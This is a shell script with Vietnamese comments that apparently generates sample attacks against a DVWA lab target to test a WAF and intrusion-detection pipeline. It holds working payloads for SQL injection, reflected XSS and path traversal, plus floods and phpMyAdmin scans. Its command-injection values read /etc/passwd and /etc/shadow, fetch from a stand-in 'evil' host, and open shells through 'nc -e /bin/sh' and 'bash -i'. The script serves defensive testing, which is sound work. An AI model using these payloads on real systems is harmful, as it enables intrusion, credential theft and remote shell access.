#!/bin/sh
# Bộ phát tấn công mẫu. Chạy TRONG một container ở external_net, ví dụ:
#   docker compose exec attacker sh -c "tr -d '\r' < /tools/attack.sh | sh -s sqli"
# Kịch bản: sqli | xss | lfi | recon | flood | bigrecon | bigflood | mix | rceburst | all
T="${T:-http://10.10.10.10}"
# Host: dvwa.local như trình duyệt thật gõ tên miền. Gửi tới địa chỉ IP thì CRS (luật 920350) cộng sẵn 3 điểm cho MỌI request,
# làm số đo chặn nhầm của Cổng 2 bị thổi phồng. Đổi bằng biến NSM_HOST.
H="Host: ${NSM_HOST:-dvwa.local}"
code(){ c=$(curl -s -H "$H" -o /dev/null -w "%{http_code}" "$T$1"); printf '%s  %s\n' "$c" "$1"; }

sqli(){ for p in "1'%20OR%20'1'='1" "1%20UNION%20SELECT%20user,password%20FROM%20users--" "1'%20AND%20SLEEP(2)--"; do
  code "/vulnerabilities/sqli/?id=$p&Submit=Submit"; done; }
xss(){ for p in "%3Cscript%3Ealert(1)%3C/script%3E" "%3Cimg%20src=x%20onerror=alert(1)%3E"; do
  code "/vulnerabilities/xss_r/?name=$p"; done; }
lfi(){ for p in "../../../../etc/passwd" "....//....//etc/passwd"; do code "/vulnerabilities/fi/?page=$p"; done; }
recon(){ for p in /phpmyadmin/ /phpmyadmin/index.php /pma/phpmyadmin/ /db/phpmyadmin/setup.php \
  /phpmyadmin/scripts/setup.php /admin/phpmyadmin/ /phpmyadmin/sql.php /mysql/phpmyadmin/; do code "$p"; done; }
flood(){ for i in $(seq 1 8); do code "/vulnerabilities/sqli/?id=$i'%20UNION%20SELECT%201,2--+-&Submit=Submit"; done; }
bigrecon(){ for i in $(seq 1 40); do code "/secret_$i.php"; done; }   # 40 đường dẫn 404 -> tầng 3 'recon'
# 150 request cùng một URI trong < 60 giây -> tầng 3 'flood' (ngưỡng TIER3_N_HI = 100 request/cửa sổ)
bigflood(){ for i in $(seq 1 150); do curl -s -H "$H" -o /dev/null "$T/index.php"; done; echo "150 x /index.php"; }
# nội dung hỗn hợp: tầng 1 (sqli/xss/lfi) + tầng 2 ML (extractvalue mà regex bỏ sót) -> 8 cảnh báo
mix(){ sqli; xss; lfi
  code "/vulnerabilities/sqli/?id=1'%20AND%20extractvalue(1,concat(0x7e,version()))--%20-&Submit=Submit"; }
# RCE qua THÂN POST. --data-urlencode để cả payload (kể cả '&&') nằm trọn trong tham số ip.
rceburst(){ for v in "127.0.0.1;cat /etc/passwd" "127.0.0.1;cat /etc/shadow" "127.0.0.1;wget http://evil/x" \
  "127.0.0.1;uname -a" "127.0.0.1|nc -e /bin/sh" "127.0.0.1;curl http://evil/s" \
  "127.0.0.1&&cat /etc/hosts" "127.0.0.1;bash -i" "127.0.0.1;id" "127.0.0.1|whoami"; do
  curl -s -H "$H" -o /dev/null -w "%{http_code} rce-body\n" --data-urlencode "ip=$v" --data-urlencode "Submit=Submit" \
    "$T/vulnerabilities/exec/"; done; }

case "${1:-all}" in
  sqli)sqli;; xss)xss;; lfi)lfi;; recon)recon;; flood)flood;;
  bigrecon)bigrecon;; bigflood)bigflood;; mix)mix;; rceburst)rceburst;;
  all) recon; sqli; xss; lfi;;
  *) echo "kịch bản không hợp lệ: $1" >&2; exit 2;;
esac
